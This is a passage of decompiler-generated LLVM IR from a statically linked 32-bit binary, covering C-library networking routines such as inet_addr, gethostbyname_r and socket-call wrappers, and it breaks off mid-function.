dec_label_pc_80521fd.thread:                      ; preds = %dec_label_pc_80521f1
  br label %dec_label_pc_8052201

dec_label_pc_80521fd:                             ; preds = %dec_label_pc_80521cc, %dec_label_pc_80521d1, %dec_label_pc_80521a3
  %v0_80521fd.lcssa = phi i32 [ %v0_80521fd13, %dec_label_pc_80521a3 ], [ %v0_80521fd48, %dec_label_pc_80521d1 ], [ %v0_80521fd48, %dec_label_pc_80521cc ]
  %v4_805220c.lcssa = phi i32 [ 0, %dec_label_pc_80521a3 ], [ %v4_805220c49, %dec_label_pc_80521d1 ], [ %v4_805220c49, %dec_label_pc_80521cc ]
  %v0_805221e.lcssa = phi i32 [ %v0_80521f74, %dec_label_pc_80521a3 ], [ %v0_805221e50, %dec_label_pc_80521d1 ], [ %v0_805221e50, %dec_label_pc_80521cc ]
  %v2_80521f7.lcssa = phi i8 [ %v2_80521f741, %dec_label_pc_80521a3 ], [ %v2_80521f751, %dec_label_pc_80521d1 ], [ %v2_80521f751, %dec_label_pc_80521cc ]
  %v4_80521f9.lcssa = phi i1 [ true, %dec_label_pc_80521a3 ], [ false, %dec_label_pc_80521d1 ], [ false, %dec_label_pc_80521cc ]
  %v1_80521fd = icmp eq i32 %v0_80521fd.lcssa, 0
  br i1 %v1_80521fd, label %dec_label_pc_8052228, label %dec_label_pc_8052201

dec_label_pc_8052201:                             ; preds = %dec_label_pc_80521fd.thread, %dec_label_pc_80521fd
  %v4_80521f9.lcssa102 = phi i1 [ true, %dec_label_pc_80521fd.thread ], [ %v4_80521f9.lcssa, %dec_label_pc_80521fd ]
  %v2_80521f7.lcssa101 = phi i8 [ %v2_80521f7, %dec_label_pc_80521fd.thread ], [ %v2_80521f7.lcssa, %dec_label_pc_80521fd ]
  %v0_805221e.lcssa100 = phi i32 [ %v1_80521f1, %dec_label_pc_80521fd.thread ], [ %v0_805221e.lcssa, %dec_label_pc_80521fd ]
  %v4_805220c.lcssa99 = phi i32 [ %storemerge, %dec_label_pc_80521fd.thread ], [ %v4_805220c.lcssa, %dec_label_pc_80521fd ]
  %v3_8052201 = icmp eq i32 %v2_8052215, 0
  br i1 %v3_8052201, label %dec_label_pc_805220c, label %dec_label_pc_8052207

dec_label_pc_8052207:                             ; preds = %dec_label_pc_8052201
  %v5_8052207 = mul i32 %v3_8052207, 256
  br label %dec_label_pc_805220c

dec_label_pc_805220c:                             ; preds = %dec_label_pc_8052201, %dec_label_pc_8052207
  %v3_805220c = phi i32 [ %v3_8052207, %dec_label_pc_8052201 ], [ %v5_8052207, %dec_label_pc_8052207 ]
  %v5_805220c = or i32 %v3_805220c, %v4_805220c.lcssa99
  %v10_8052210 = icmp eq i8 %v2_80521f7.lcssa101, 46
  %v1_8052213 = icmp eq i1 %v10_8052210, false
  br i1 %v1_8052213, label %dec_label_pc_8052224, label %dec_label_pc_8052215

dec_label_pc_8052215:                             ; preds = %dec_label_pc_805220c
  %v11_8052218 = icmp eq i32 %v2_8052215, 3
  br i1 %v11_8052218, label %dec_label_pc_8052228, label %dec_label_pc_805221e

dec_label_pc_805221e:                             ; preds = %dec_label_pc_8052215
  %v3_8052215 = add i32 %v2_8052215, 1
  %v1_805221e = add i32 %v0_805221e.lcssa100, 1
  br label %dec_label_pc_8052176

dec_label_pc_8052224:                             ; preds = %dec_label_pc_805220c
  br i1 %v4_80521f9.lcssa102, label %dec_label_pc_8052230, label %dec_label_pc_8052228

dec_label_pc_8052228:                             ; preds = %dec_label_pc_8052215, %dec_label_pc_80521fd, %dec_label_pc_80521e9, %dec_label_pc_80521bc, %dec_label_pc_8052224
  br label %dec_label_pc_8052230

dec_label_pc_8052230:                             ; preds = %dec_label_pc_8052224, %dec_label_pc_8052228
  %v3_8052230 = phi i32 [ %v5_805220c, %dec_label_pc_8052224 ], [ -1, %dec_label_pc_8052228 ]
  ret i32 %v3_8052230

; uselistorder directives
  uselistorder i32 %v5_805220c, { 1, 0 }
  uselistorder i32 %v6_80521f7, { 1, 0 }
  uselistorder i32 %v3_80521f7, { 1, 0 }
  uselistorder i8 %v2_80521f7, { 0, 2, 3, 1 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v2_80521e2, { 1, 0 }
  uselistorder i32 %v4_80521c3, { 1, 0 }
  uselistorder i32 %v4_805220c49, { 2, 3, 1, 0 }
  uselistorder i8 %v2_80521f751, { 1, 2, 0 }
  uselistorder i32 %v0_80521cc10, { 0, 2, 1 }
  uselistorder i32 %v0_8052184, { 1, 0, 2, 3 }
  uselistorder i32 %v2_8052215, { 1, 0, 2 }
  uselistorder i32 %v3_8052207, { 1, 0 }
  uselistorder label %dec_label_pc_8052230, { 1, 0 }
  uselistorder label %dec_label_pc_8052228, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_805220c, { 1, 0 }
  uselistorder label %dec_label_pc_8052201, { 1, 0 }
  uselistorder label %dec_label_pc_80521fd, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80521e9, { 1, 0 }
  uselistorder label %dec_label_pc_80521a7, { 1, 0 }
  uselistorder label %dec_label_pc_80521a3, { 2, 0, 1 }
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v2_805223f = ptrtoint i32* %stack_var_-4 to i32
  %v2_8052248 = inttoptr i32 %arg1 to i8*
  %v3_8052248 = call i32 @inet_aton(i8* %v2_8052248, i32 %v2_805223f)
  store i32 -1, i32* @edx, align 4
  %v1_8052253 = icmp eq i32 %v3_8052248, 0
  br i1 %v1_8052253, label %dec_label_pc_805225b, label %dec_label_pc_8052257

dec_label_pc_8052257:                             ; preds = %entry
  %v3_8052257 = load i32, i32* %stack_var_-4, align 4
  store i32 %v3_8052257, i32* @edx, align 4
  br label %dec_label_pc_805225b

dec_label_pc_805225b:                             ; preds = %entry, %dec_label_pc_8052257
  %v0_805225b = phi i32 [ -1, %entry ], [ %v3_8052257, %dec_label_pc_8052257 ]
  ret i32 %v0_805225b

; uselistorder directives
  uselistorder label %dec_label_pc_805225b, { 1, 0 }
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8052267 = call i32 @__GI___h_errno_location()
  %v0_805226c = load i32, i32* @edx, align 4
  %v2_805226f = ptrtoint i32* %stack_var_-4 to i32
  %v9_8052287 = call i32 @gethostbyname_r(i32 %arg1, i32* nonnull @global_var_806762c.230, i32 ptrtoint (i32* @global_var_8067460.229 to i32), i32 460, i32 %v2_805226f, i32 %v0_8052267, i32 %v0_805226c, i32 %v0_805226c)
  %v3_805228c = load i32, i32* %stack_var_-4, align 4
  ret i32 %v3_805228c
}

define i32 @gethostbyname_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %tmp11 = call i64 @__decompiler_undefined_function_2()
  %tmp18 = ptrtoint i32* %arg2 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %v0_8052294 = load i32, i32* @ebp, align 4
  %v0_8052295 = load i32, i32* @edi, align 4
  %v0_8052296 = load i32, i32* @esi, align 4
  %v0_8052297 = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v1_80522a7 = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v1_80522a7, align 4
  store i32 22, i32* %eax.global-to-local, align 4
  %v4_80522b2 = icmp eq i32 %arg1, 0
  br i1 %v4_80522b2, label %dec_label_pc_80525be, label %dec_label_pc_80522bd

dec_label_pc_80522bd:                             ; preds = %entry
  %v1_80522bd = call i32 @__errno_location(i32 %v0_8052297)
  store i32 %v1_80522bd, i32* %eax.global-to-local, align 4
  %v1_80522c2 = inttoptr i32 %v1_80522bd to i32*
  %v2_80522c2 = load i32, i32* %v1_80522c2, align 4
  store i32 %v2_80522c2, i32* @edi, align 4
  store i32 %v1_80522bd, i32* @esi, align 4
  store i32 0, i32* %v1_80522c2, align 4
  %v0_80522d5 = load i32, i32* @ebx, align 4
  store i32 %v0_80522d5, i32* %stack_var_-108, align 4
  %v7_80522e1 = call i32 @__get_hosts_byname_r(i32 %arg1, i32 2, i32 %tmp18, i32 %v0_80522d5, i32 %arg5, i32 %arg6, i32 %v1_80522bd)
  store i32 %v7_80522e1, i32* %eax.global-to-local, align 4
  %v1_80522e9 = icmp eq i32 %v7_80522e1, 0
  br i1 %v1_80522e9, label %dec_label_pc_80525be, label %dec_label_pc_80522f1

dec_label_pc_80522f1:                             ; preds = %dec_label_pc_80522bd
  store i32 %arg6, i32* @ecx, align 4
  %v1_80522f5 = inttoptr i32 %arg6 to i32*
  %v2_80522f5 = load i32, i32* %v1_80522f5, align 4
  store i32 %v2_80522f5, i32* %edx.global-to-local, align 4
  %v9_80522f7 = icmp eq i32 %v2_80522f5, 1
  br i1 %v9_80522f7, label %dec_label_pc_8052311, label %dec_label_pc_80522fc

dec_label_pc_80522fc:                             ; preds = %dec_label_pc_80522f1
  %v9_80522fc = icmp eq i32 %v2_80522f5, 4
  br i1 %v9_80522fc, label %dec_label_pc_8052311, label %dec_label_pc_8052301

dec_label_pc_8052301:                             ; preds = %dec_label_pc_80522fc
  %v1_8052301 = add i32 %v2_80522f5, 1
  %v8_8052301 = icmp eq i32 %v1_8052301, 0
  store i32 %v1_8052301, i32* %edx.global-to-local, align 4
  %v1_8052302 = icmp eq i1 %v8_8052301, false
  br i1 %v1_8052302, label %dec_label_pc_80525be, label %dec_label_pc_8052308

dec_label_pc_8052308:                             ; preds = %dec_label_pc_8052301
  %v0_8052308 = load i32, i32* @esi, align 4
  %v1_8052308 = inttoptr i32 %v0_8052308 to i32*
  %v2_8052308 = load i32, i32* %v1_8052308, align 4
  %v11_8052308 = icmp eq i32 %v2_8052308, 2
  %v1_805230b = icmp eq i1 %v11_8052308, false
  br i1 %v1_805230b, label %dec_label_pc_80525be, label %dec_label_pc_8052311

dec_label_pc_8052311:                             ; preds = %dec_label_pc_8052308, %dec_label_pc_80522fc, %dec_label_pc_80522f1
  %v0_8052311 = load i32, i32* @ebp, align 4
  %v1_8052313 = sub i32 0, %v0_8052311
  %v1_8052315 = urem i32 %v1_8052313, 4
  %v2_8052315 = icmp eq i32 %v1_8052315, 0
  store i32 %v1_8052315, i32* %eax.global-to-local, align 4
  %v0_8052318 = load i32, i32* @edi, align 4
  %v1_8052318 = load i32, i32* @esi, align 4
  %v2_8052318 = inttoptr i32 %v1_8052318 to i32*
  store i32 %v0_8052318, i32* %v2_8052318, align 4
  %v0_805232c.pre = load i32, i32* @ebx, align 4
  br i1 %v2_8052315, label %dec_label_pc_8052328, label %dec_label_pc_805231c

dec_label_pc_805231c:                             ; preds = %dec_label_pc_8052311
  %v1_805231c = load i32, i32* %eax.global-to-local, align 4
  %v2_805231c = sub i32 %v0_805232c.pre, %v1_805231c
  %v7_805231c = icmp ult i32 %v0_805232c.pre, %v1_805231c
  br i1 %v7_805231c, label %dec_label_pc_80525b9, label %dec_label_pc_8052324

dec_label_pc_8052324:                             ; preds = %dec_label_pc_805231c
  %v0_8052324 = load i32, i32* @ebp, align 4
  %v2_8052324 = add i32 %v0_8052324, %v1_805231c
  store i32 %v2_8052324, i32* @ebp, align 4
  store i32 %v2_805231c, i32* @ebx, align 4
  br label %dec_label_pc_8052328

dec_label_pc_8052328:                             ; preds = %dec_label_pc_8052311, %dec_label_pc_8052324
  %v0_805232c = phi i32 [ %v2_805231c, %dec_label_pc_8052324 ], [ %v0_805232c.pre, %dec_label_pc_8052311 ]
  store i32 %arg6, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %v1_80522f5, align 4
  %tmp41 = icmp ult i32 %v0_805232c, 4
  br i1 %tmp41, label %dec_label_pc_80525b9, label %dec_label_pc_805233b

dec_label_pc_805233b:                             ; preds = %dec_label_pc_8052328
  %v0_805233b = load i32, i32* @ebx, align 4
  %v1_805233b = add i32 %v0_805233b, -4
  store i32 %v1_805233b, i32* %eax.global-to-local, align 4
  %tmp42 = icmp ult i32 %v1_805233b, 8
  br i1 %tmp42, label %dec_label_pc_80525b9, label %dec_label_pc_8052347

dec_label_pc_8052347:                             ; preds = %dec_label_pc_805233b
  %v1_8052347 = add i32 %v0_805233b, -12
  store i32 %v1_8052347, i32* %eax.global-to-local, align 4
  %v0_805234a = load i32, i32* @ebp, align 4
  %v1_805234a = add i32 %v0_805234a, 4
  store i32 %v1_805234a, i32* %edx.global-to-local, align 4
  store i32 %v1_805234a, i32* %stack_var_-92, align 4
  %v3_8052353 = inttoptr i32 %v1_805234a to i32*
  store i32 %v0_805234a, i32* %v3_8052353, align 4
  %v0_8052356 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052356 = add i32 %v0_8052356, 4
  %v2_8052356 = inttoptr i32 %v1_8052356 to i32*
  store i32 0, i32* %v2_8052356, align 4
  %tmp43 = icmp ult i32 %v1_8052347, 32
  br i1 %tmp43, label %dec_label_pc_80525b9, label %dec_label_pc_8052363

dec_label_pc_8052363:                             ; preds = %dec_label_pc_8052347
  %v0_8052363 = load i32, i32* @ebx, align 4
  %v1_8052363 = add i32 %v0_8052363, -44
  store i32 %v1_8052363, i32* @ebx, align 4
  %tmp44 = icmp ult i32 %v1_8052363, 256
  br i1 %tmp44, label %dec_label_pc_80525b9, label %dec_label_pc_8052376

dec_label_pc_8052376:                             ; preds = %dec_label_pc_8052363
  %v0_8052376 = load i32, i32* @ebp, align 4
  %v1_8052376 = add i32 %v0_8052376, 12
  %v1_805237d = add i32 %v0_8052376, 44
  store i32 %v1_805237d, i32* @edi, align 4
  store i32 %v1_805237d, i32* %stack_var_-108, align 4
  %v3_805238a = inttoptr i32 %v1_805237d to i8*
  %v4_805238a = call i32 @strncpy(i8* %v3_805238a, i32 %arg1, i32 %v1_8052363)
  %v0_805238f = load i32, i32* @edi, align 4
  %v1_805238f = load i32, i32* @ebp, align 4
  %v2_805238f = add i32 %v1_805238f, 12
  %v3_805238f = inttoptr i32 %v2_805238f to i32*
  store i32 %v0_805238f, i32* %v3_805238f, align 4
  %v1_8052396 = add i32 %v0_8052376, 16
  %v2_8052396 = inttoptr i32 %v1_8052396 to i32*
  store i32 0, i32* %v2_8052396, align 4
  %v2_805239d = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_805239d, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @edx, align 4
  %v0_805239f = load i32, i32* @ebp, align 4
  store i32 %arg1, i32* %stack_var_-108, align 4
  %v2_80523a4 = inttoptr i32 %arg1 to i8*
  %v3_80523a4 = call i32 @inet_aton(i8* %v2_80523a4, i32 %v0_805239f)
  store i32 %v3_80523a4, i32* %eax.global-to-local, align 4
  %v1_80523ac = icmp eq i32 %v3_80523a4, 0
  br i1 %v1_80523ac, label %dec_label_pc_80523e8, label %dec_label_pc_80523b0

dec_label_pc_80523b0:                             ; preds = %dec_label_pc_8052376
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  %v0_80523b4 = load i32, i32* @edi, align 4
  store i32 %v0_80523b4, i32* %arg2, align 4
  %v1_80523b6 = add i32 %tmp18, 8
  %v2_80523b6 = inttoptr i32 %v1_80523b6 to i32*
  store i32 2, i32* %v2_80523b6, align 4
  %v0_80523bd = load i32, i32* %edx.global-to-local, align 4
  %v1_80523bd = add i32 %v0_80523bd, 12
  %v2_80523bd = inttoptr i32 %v1_80523bd to i32*
  store i32 4, i32* %v2_80523bd, align 4
  %v2_80523c4 = load i32, i32* %stack_var_-92, align 4
  %v1_80523c7 = load i32, i32* %edx.global-to-local, align 4
  %v2_80523c7 = add i32 %v1_80523c7, 16
  %v3_80523c7 = inttoptr i32 %v2_80523c7 to i32*
  store i32 %v2_80523c4, i32* %v3_80523c7, align 4
  %v1_80523ce = load i32, i32* %edx.global-to-local, align 4
  %v2_80523ce = add i32 %v1_80523ce, 4
  %v3_80523ce = inttoptr i32 %v2_80523ce to i32*
  store i32 %v1_8052376, i32* %v3_80523ce, align 4
  store i32 %arg5, i32* @ecx, align 4
  %v0_80523d5 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_80523d5, i32* %v1_80522a7, align 4
  store i32 0, i32* %v1_80522f5, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80525be

dec_label_pc_80523e8:                             ; preds = %dec_label_pc_8052376
  %v0_80523e8 = call i32 @__open_nameservers()
  store i32 %v0_80523e8, i32* %eax.global-to-local, align 4
  %v2_80523f8 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_80523f8, i32* @ebx, align 4
  store i32 %v2_80523f8, i32* %stack_var_-108, align 4
  %v4_80523fd = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-36, i32 134541533, i32 ptrtoint (i32* @global_var_8062de8.231 to i32))
  store i32 %v4_80523fd, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8062de8.231 to i32), i32* %stack_var_-108, align 4
  %v1_8052409 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8062de8.231 to i32))
  store i32 ptrtoint (i32* @global_var_8062de8.231 to i32), i32* @ecx, align 4
  store i32 134541533, i32* %eax.global-to-local, align 4
  store i32 %v2_80523f8, i32* %stack_var_-108, align 4
  %v3_8052419 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-36, i32 1)
  store i32 1, i32* %edx.global-to-local, align 4
  %v2_8052434 = ptrtoint i32* %stack_var_-76 to i32
  %v2_8052439 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8052439, i32* %eax.global-to-local, align 4
  store i32 %v2_8052439, i32* %stack_var_-108, align 4
  %v0_8052443 = load i32, i32* @esi, align 4
  %v7_805244a = call i32 @__dns_lookup(i8* %v2_80523a4, i32 1, i32 %v0_8052443, i32 ptrtoint (i32* @global_var_8067e54.233 to i32), i32 %v2_8052439, i32 %v2_8052434)
  store i32 %v7_805244a, i32* %eax.global-to-local, align 4
  %v2_8052452 = icmp slt i32 %v7_805244a, 0
  %v1_8052454 = icmp eq i1 %v2_8052452, false
  br i1 %v1_8052454, label %dec_label_pc_805246a, label %dec_label_pc_8052456

dec_label_pc_8052456:                             ; preds = %dec_label_pc_80523e8
  store i32 %arg6, i32* @ecx, align 4
  store i32 2, i32* %eax.global-to-local, align 4
  store i32 1, i32* %v1_80522f5, align 4
  br label %dec_label_pc_80525be

dec_label_pc_805246a:                             ; preds = %dec_label_pc_80523e8
  %v4_805246a = trunc i64 %tmp11 to i32
  store i32 %v4_805246a, i32* @ecx, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 256, i32* %eax.global-to-local, align 4
  %v10_805247d = icmp ugt i32 %v1_8052363, 256
  %v15_805247d = icmp eq i32 %v0_8052363, 300
  %v2_8052481 = or i1 %v10_805247d, %v15_805247d
  br i1 %v2_8052481, label %dec_label_pc_805251c, label %dec_label_pc_8052483

dec_label_pc_8052483:                             ; preds = %dec_label_pc_805246a
  %v3_8052486 = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_8052486, i32* %stack_var_-108, align 4
  %v1_805248a = call i32 @free(i32 %v3_8052486)
  store i32 %v1_805248a, i32* %eax.global-to-local, align 4
  store i32 %v3_8052486, i32* @edi, align 4
  %v3_8052490 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_8052490, i32* %stack_var_-108, align 4
  %v1_8052494 = call i32 @free(i32 %v3_8052490)
  store i32 -1, i32* %v1_80522f5, align 4
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052594

dec_label_pc_805251c:                             ; preds = %dec_label_pc_805246a
  %v3_8052521.pre = load i32, i32* %stack_var_-76, align 4
  %v0_8052525.pre = load i32, i32* @edi, align 4
  store i32 %v0_8052525.pre, i32* %stack_var_-108, align 4
  %v3_8052526 = inttoptr i32 %v0_8052525.pre to i8*
  %v4_8052526 = call i32 @strncpy(i8* %v3_8052526, i32 %v3_8052521.pre, i32 %v1_8052363)
  store i32 %v4_8052526, i32* %eax.global-to-local, align 4
  store i32 %v0_8052525.pre, i32* @ecx, align 4
  %v3_805252c = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_805252c, i32* %stack_var_-108, align 4
  %v1_8052530 = call i32 @free(i32 %v3_805252c)
  store i32 %v1_8052530, i32* %eax.global-to-local, align 4
  %v12_8052538 = icmp eq i32 %tmp10, 1
  %v1_805253d = icmp eq i1 %v12_8052538, false
  br i1 %v1_805253d, label %dec_label_pc_8052599, label %dec_label_pc_805253f

dec_label_pc_805253f:                             ; preds = %dec_label_pc_805251c
  %v0_805253f = load i32, i32* @edx, align 4
  %v0_8052546 = load i32, i32* @ebp, align 4
  store i32 %v0_8052546, i32* %stack_var_-108, align 4
  %v3_8052547 = inttoptr i32 %tmp to i16*
  %v4_8052547 = call i32 @memcpy(i16* %v3_8052547, i32 4, i32 %v0_805253f)
  store i32 %tmp18, i32* %eax.global-to-local, align 4
  %v0_8052550 = load i32, i32* @edi, align 4
  store i32 %v0_8052550, i32* %arg2, align 4
  %v1_8052552 = add i32 %tmp18, 8
  %v2_8052552 = inttoptr i32 %v1_8052552 to i32*
  store i32 2, i32* %v2_8052552, align 4
  %v0_8052559 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052559 = add i32 %v0_8052559, 12
  %v2_8052559 = inttoptr i32 %v1_8052559 to i32*
  store i32 4, i32* %v2_8052559, align 4
  %v3_8052560 = load i32, i32* %stack_var_-92, align 4
  store i32 %v3_8052560, i32* %edx.global-to-local, align 4
  %v1_8052564 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052564 = add i32 %v1_8052564, 16
  %v3_8052564 = inttoptr i32 %v2_8052564 to i32*
  store i32 %v3_8052560, i32* %v3_8052564, align 4
  store i32 %v1_8052376, i32* @ecx, align 4
  %v1_805256b = load i32, i32* %eax.global-to-local, align 4
  %v2_805256b = add i32 %v1_805256b, 4
  %v3_805256b = inttoptr i32 %v2_805256b to i32*
  store i32 %v1_8052376, i32* %v3_805256b, align 4
  %v2_805256e = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_805256e, i32* %eax.global-to-local, align 4
  %v3_805256f = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_805256f, i32* %stack_var_-108, align 4
  %v1_8052573 = call i32 @free(i32 %v3_805256f)
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  store i32 %tmp18, i32* %v1_80522a7, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %arg6, i32* @ecx, align 4
  store i32 0, i32* %v1_80522f5, align 4
  br label %dec_label_pc_8052594

dec_label_pc_8052594:                             ; preds = %dec_label_pc_8052599, %dec_label_pc_8052483, %dec_label_pc_805253f
  br label %dec_label_pc_80525be

dec_label_pc_8052599:                             ; preds = %dec_label_pc_805251c
  %v3_805259c = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_805259c, i32* %stack_var_-108, align 4
  %v1_80525a0 = call i32 @free(i32 %v3_805259c)
  store i32 1, i32* %v1_80522f5, align 4
  store i32 2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052594

dec_label_pc_80525b9:                             ; preds = %dec_label_pc_8052363, %dec_label_pc_8052347, %dec_label_pc_805233b, %dec_label_pc_8052328, %dec_label_pc_805231c
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80525be

dec_label_pc_80525be:                             ; preds = %dec_label_pc_8052308, %dec_label_pc_8052301, %dec_label_pc_80522bd, %entry, %dec_label_pc_8052594, %dec_label_pc_8052456, %dec_label_pc_80523b0, %dec_label_pc_80525b9
  store i32 %v0_8052297, i32* @ebx, align 4
  store i32 %v0_8052296, i32* @esi, align 4
  store i32 %v0_8052295, i32* @edi, align 4
  store i32 %v0_8052294, i32* @ebp, align 4
  %v0_80525c5 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_80525c5

; uselistorder directives
  uselistorder i32 %v1_805237d, { 1, 0, 2 }
  uselistorder i32 %v1_8052376, { 2, 1, 0 }
  uselistorder i32 %v1_8052363, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_805232c.pre, { 0, 2, 1 }
  uselistorder i32 %v1_8052315, { 1, 0 }
  uselistorder i32 %v2_80522f5, { 2, 0, 1, 3 }
  uselistorder i32* %v1_80522f5, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32* %v1_80522a7, { 1, 0, 2 }
  uselistorder i32* %stack_var_-76, { 1, 0, 2, 3 }
  uselistorder i32 %tmp18, { 6, 5, 0, 4, 1, 3, 2 }
  uselistorder i32* %eax.global-to-local, { 29, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 26, 27, 28, 30 }
  uselistorder i32 %arg6, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg5, { 2, 0, 1 }
  uselistorder i32 %arg1, { 5, 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_80525be, { 7, 4, 5, 6, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8052594, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8052328, { 1, 0 }
}

define i32 @__libc_accept(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_80525e3 = ptrtoint i32* %stack_var_-12 to i32
  %v2_80525ea = call i32 @__socketcall(i32 5, i32 %v2_80525e3)
  ret i32 %v2_80525ea

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @bind(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_805260f = ptrtoint i32* %stack_var_-12 to i32
  %v2_8052616 = call i32 @__socketcall(i32 2, i32 %v2_805260f)
  ret i32 %v2_8052616

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_805263b = ptrtoint i32* %stack_var_-12 to i32
  %v2_8052642 = call i32 @__socketcall(i32 3, i32 %v2_805263b)
  ret i32 %v2_8052642

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @listen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-8, align 4
  %v2_805265f = ptrtoint i32* %stack_var_-8 to i32
  %v2_8052666 = call i32 @__socketcall(i32 4, i32 %v2_805265f)
  ret i32 %v2_8052666

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_8052693 = ptrtoint i32* %stack_var_-16 to i32
  %v2_805269a = call i32 @__socketcall(i32 10, i32 %v2_8052693)
  ret i32 %v2_805269a

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @__libc_recvfrom(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_80526d7 = ptrtoint i32* %stack_var_-24 to i32
  %v2_80526de = call i32 @__socketcall(i32 12, i32 %v2_80526d7)
  ret i32 %v2_80526de

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__libc_recvmsg(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_8052703 = ptrtoint i32* %stack_var_-12 to i32
  %v2_805270a = call i32 @__socketcall(i32 17, i32 %v2_8052703)
  ret i32 %v2_805270a

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_8052737 = ptrtoint i32* %stack_var_-16 to i32
  %v2_805273e = call i32 @__socketcall(i32 9, i32 %v2_8052737)
  ret i32 %v2_805273e

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @__libc_sendmsg(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_8052763 = ptrtoint i32* %stack_var_-12 to i32
  %v2_805276a = call i32 @__socketcall(i32 16, i32 %v2_8052763)
  ret i32 %v2_805276a

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
